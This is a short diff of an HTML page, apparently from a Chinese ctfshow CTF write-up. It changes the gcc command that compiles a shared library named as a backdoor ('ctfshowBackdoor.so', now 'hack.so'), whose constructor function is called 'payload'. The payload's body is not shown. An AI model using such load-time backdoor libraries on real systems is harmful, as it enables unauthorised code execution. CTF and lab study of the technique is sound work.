@@ -900,7 +900,7 @@ __attribute__((constructor))void payload()&#123;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后直接gcc生成共享库</p>
-<pre class="line-numbers language-none"><code class="language-none">gcc --shared -fPIC ctfshowBackdoor.c -o ctfshowBackdoor.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC a.c -o hack&amp;&amp;gcc --share hack -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
